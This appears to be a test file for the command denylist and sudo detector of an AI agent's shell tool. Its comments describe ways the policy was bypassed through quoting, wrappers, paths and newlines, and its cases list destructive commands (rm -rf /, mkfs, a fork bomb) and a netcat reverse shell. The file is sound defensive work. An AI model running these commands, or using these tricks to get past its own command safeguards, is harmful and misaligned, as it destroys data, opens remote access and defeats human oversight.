import { describe, expect, it } from 'vitest';
import { commandPolicyViolation, matchElevatedCommand, tokenizeSafe } from './policy';

/**
 * The content policy has to be true of the command that gets SPAWNED, not of
 * the string as typed.
 *
 * `tokenizeSafe` strips quotes and backslashes before `spawn`, so every rule
 * written against the raw text had a trivial bypass: `rm -rf '/'` matched no
 * denylist entry and reached `spawn` as `rm -rf /`, and `'sudo' npm test`
 * matched no elevated pattern, which downgraded `ShellTool` from
 * `execute_elevated` (DENY by default) to `execute` (ASK).
 */
describe('the denylist survives quoting', () => {
  it.each([
    ["rm -rf '/'", 'rm -rf /'],
    ['rm -rf "/"', 'rm -rf /'],
    ['rm -rf \\/', 'rm -rf /'],
  ])('%s tokenizes to %s and is refused', (written, spawned) => {
    expect(tokenizeSafe(written)?.join(' ')).toBe(spawned);
    expect(commandPolicyViolation(written)).toMatch(/Blocked command detected/);
  });

  it('still refuses the plain form', () => {
    expect(commandPolicyViolation('rm -rf /')).toMatch(/Blocked command detected/);
  });

  it('leaves an ordinary command alone', () => {
    expect(commandPolicyViolation('npm test')).toBeNull();
    expect(commandPolicyViolation('cargo test --all')).toBeNull();
  });
});

describe('elevation detection survives quoting and leading space', () => {
  it.each(["'sudo' npm test", '"sudo" npm test', '\\sudo npm test', '  sudo npm test'])(
    '%s is still elevated',
    (command) => {
      expect(matchElevatedCommand(command)).toBe('sudo');
    },
  );

  it('still matches the plain and separated forms', () => {
    expect(matchElevatedCommand('sudo npm test')).toBe('sudo');
    expect(matchElevatedCommand('true && systemctl restart x')).toBe('systemctl');
  });

  it('does not fire on an ordinary command', () => {
    expect(matchElevatedCommand('npm test')).toBeNull();
    // Substring, not a command: `pseudo` must not read as `sudo`.
    expect(matchElevatedCommand('pseudo-tty-check')).toBeNull();
  });
});

describe('tokenizeSafe still refuses what it always refused', () => {
  it.each(['a; b', 'a | b', 'a && b', 'a > f', 'echo `x`', 'echo $(x)', 'cp {a,b}'])(
    'refuses %s',
    (command) => {
      expect(tokenizeSafe(command)).toBeNull();
    },
  );
});

describe('the denylist reads a command, not a mention of one', () => {
  it('allows a search whose ARGUMENT happens to spell a blocked command', () => {
    // Tokenizing strips the quotes, so a substring test over the joined argv
    // finds `chmod 777 /` inside `grep -rn chmod 777 /etc` and refuses a
    // read-only search. The argv check is anchored at argv[0] to avoid that.
    expect(commandPolicyViolation('grep -rn "chmod 777" /etc')).toBeNull();
    expect(commandPolicyViolation('npm test --grep "chmod 777" /tmp')).toBeNull();
  });

  it('no longer refuses a command that merely mentions a blocked entry', () => {
    // The scan used to be a plain substring test, which refused any command
    // whose text spelled an entry anywhere. Measured on the shipped list, that
    // meant `nc ` blocked `npm run sync tests`, `go test ./internal/sync` and
    // `cargo test --features async ui` — ordinary verification commands, all
    // three. A scorer treats such a refusal as unfixable, so it would have
    // failed correct children over a command that never ran.
    expect(commandPolicyViolation('npm run sync tests')).toBeNull();
    expect(commandPolicyViolation('go test ./internal/sync -run X')).toBeNull();
    expect(commandPolicyViolation('cargo test --features async ui')).toBeNull();
    expect(commandPolicyViolation('grep -r "rm -rf /" .')).toBeNull();
    expect(commandPolicyViolation('find . -name mkfs.conf')).toBeNull();
  });

  it('still refuses the entry when it IS the command', () => {
    // The loosening above must not reach a real invocation: at the start of the
    // line, after a separator, or behind an environment-variable prefix.
    expect(commandPolicyViolation('nc -e /bin/sh 10.0.0.1 4444')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('foo | nc host 1234')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('X=1 rm -rf /')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('LC_ALL=C DEBUG=1 mkfs /dev/sda')).toMatch(/Blocked command detected/);
  });

  it('still refuses the dequoted command itself', () => {
    expect(commandPolicyViolation("rm -rf '/'")).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('rm -rf "/"')).toMatch(/Blocked command detected/);
  });
});

describe('the dequoted check reaches the sh -c path too', () => {
  it('refuses a quoted danger behind a separator, which never tokenizes', () => {
    // `tokenizeSafe` returns null at the `&&`, so the argv form does not exist
    // — and that is exactly when `sh -c` runs the string and strips the quotes
    // itself. Checking only the argv left this path open.
    expect(commandPolicyViolation("true && rm -rf '/'")).toMatch(/Blocked command detected/);
    // Refused as an injection rather than a denylist hit — a different message,
    // the same refusal, and the assertion says so rather than pinning prose.
    expect(commandPolicyViolation('echo x; rm -rf "/"')).not.toBeNull();
  });

  it('does not block a longer command that merely starts with an entry', () => {
    // `ncdu` is not `nc `. Matching the dequoted argv without a boundary check
    // blocked it, because the `nc ` entry trims to `nc` and `ncdu` starts with
    // it — a regression this branch introduced and this pins.
    expect(commandPolicyViolation('ncdu "/var/log"')).toBeNull();
    expect(commandPolicyViolation('ncdu /var/log')).toBeNull();
    expect(commandPolicyViolation('netcatalog list')).toBeNull();
  });

  it('does not refuse a longer command name that begins with an entry', () => {
    expect(commandPolicyViolation('haltcheck --x y')).toBeNull();
    expect(commandPolicyViolation('shutdownctl --status')).toBeNull();
    // …while the real ones stay refused.
    expect(commandPolicyViolation('halt')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('shutdown -h now')).toMatch(/Blocked command detected/);
  });

  it('still refuses the real command after a separator', () => {
    expect(commandPolicyViolation('echo x && shutdown')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('true; halt')).toMatch(/Blocked command detected/);
  });
});

/**
 * The two mistakes this matcher sits between, pinned as one table each.
 *
 * A plain substring test refused ordinary work (`nc ` inside `npm run sync
 * tests`). Pure head-anchoring — the first attempt at fixing that — waved
 * through every wrapper: `sh -c "rm -rf /"`, `timeout 5 rm -rf /`, `nohup
 * halt`, a fork bomb whose own separators shattered the split, and anything
 * behind a newline.
 */
describe('a wrapper does not hide the command it runs', () => {
  it.each([
    'sh -c "rm -rf /"',
    'bash -c "shutdown -h now"',
    'env rm -rf /',
    'timeout 5 rm -rf /',
    'nohup halt',
    'sh -c "nc -e /bin/sh 1.2.3.4 4444"',
    'X=1 timeout 3 sh -c "mkfs /dev/sda"',
  ])('refuses %s', (command) => {
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('sees an elevated command through a wrapper too', () => {
    expect(matchElevatedCommand('sh -c "sudo x"')).toBe('sudo');
    expect(matchElevatedCommand('timeout 5 sudo apt update')).toBe('sudo');
  });
});

describe('separators the split must not lose', () => {
  it('matches a fork bomb, whose own separators would shatter it', () => {
    // `:(){:|:&};:` splits into fragments that match nothing, so an entry
    // carrying a separator is matched against the whole string instead.
    expect(commandPolicyViolation(':(){:|:&};:')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation(':(){ :|:& };:')).toMatch(/Blocked command detected/);
  });

  it('treats a newline as a command separator', () => {
    // Whitespace normalization used to collapse newlines before the split, so
    // a second line read as arguments to the first command.
    expect(commandPolicyViolation('echo hi\nshutdown -h now')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('echo hi\nrm -rf /')).toMatch(/Blocked command detected/);
  });
});

describe('and none of that re-refuses ordinary work', () => {
  it.each([
    'npm run sync tests',
    'go test ./internal/sync -run X',
    'cargo test --features async ui',
    'npm test',
    'grep -r "rm -rf /" .',
    'ncdu /var/log',
    'haltcheck --x y',
    'shutdownctl --status',
    'find . -name mkfs.conf',
    'pytest tests/ -k "sync and not slow"',
  ])('allows %s', (command) => {
    expect(commandPolicyViolation(command)).toBeNull();
  });
});

describe('a path does not hide the command either', () => {
  it.each([
    '/bin/rm -rf /',
    '/usr/sbin/shutdown -h now',
    '/bin/sh -c "rm -rf /"',
    '/usr/bin/env rm -rf /',
  ])('refuses %s', (command) => {
    // `/bin/rm` and `rm` run the same program, so the denylist has to compare
    // the same thing. Matching only the bare name let every path-qualified
    // form through — and each one tokenizes into a spawnable argv.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('sees an elevated command by its path', () => {
    expect(matchElevatedCommand('/usr/bin/sudo apt update')).toBe('sudo');
  });
});

describe('a command carried as an argument of another', () => {
  it.each(['find . -exec rm -rf / \;', '(rm -rf /)', 'true && (rm -rf /)'])(
    'refuses %s',
    (command) => {
      // `-exec` introduces a command in its own right, and a subshell is a
      // separator like any other. Without both, `find . -exec rm -rf /` reads
      // as an ordinary invocation of `find`.
      expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
    },
  );
});

describe('stepping over a wrapper’s own arguments, not past its payload', () => {
  it.each([
    'timeout 60 npm run halt',
    'env npm run halt',
    'xargs -n1 npm run reboot',
    'timeout 5 npm run kill',
  ])('allows %s', (command) => {
    // Enumerating every suffix after a wrapper refused all four. As a
    // `command_exit_zero` command that refusal is marked unfixable, so the
    // child would be permanently `contract_failed` over a command that never
    // ran.
    expect(commandPolicyViolation(command)).toBeNull();
  });

  it('is not elevated just because a later argument names an elevated tool', () => {
    expect(matchElevatedCommand('timeout 5 npm run kill')).toBeNull();
  });

  it('still finds the payload a wrapper actually runs', () => {
    expect(commandPolicyViolation('timeout 5 rm -rf /')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('nice -n 5 halt')).toMatch(/Blocked command detected/);
  });
});

describe('peeling reaches the command through stacked wrappers', () => {
  it.each([
    'env FOO=1 rm -rf /',
    'nohup timeout 5 halt',
    'nohup nice -n 5 halt',
    'timeout 5 env A=1 rm -rf /',
    'xargs -I {} rm -rf /',
  ])('refuses %s', (command) => {
    // Single-pass unwrapping missed all of these: an assignment can sit AFTER a
    // wrapper as easily as before one, wrappers stack, and `-I {}` puts a
    // placeholder between the flag and the payload.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('finds an elevated command behind a wrapper and an assignment', () => {
    // Peeling the assignment and the wrapper in one step skips straight past
    // `sudo` here, which is why each step offers its own candidate.
    expect(matchElevatedCommand('env A=1 sudo npm i')).toBe('sudo');
    expect(matchElevatedCommand('nohup timeout 5 sudo apt update')).toBe('sudo');
  });

  it('and still allows the same shapes carrying ordinary commands', () => {
    expect(commandPolicyViolation('env FOO=1 npm run halt')).toBeNull();
    expect(commandPolicyViolation('nohup timeout 5 npm run reboot')).toBeNull();
    expect(commandPolicyViolation('xargs -I {} npm run kill')).toBeNull();
    expect(matchElevatedCommand('env A=1 npm run sudo-check')).toBeNull();
  });
});
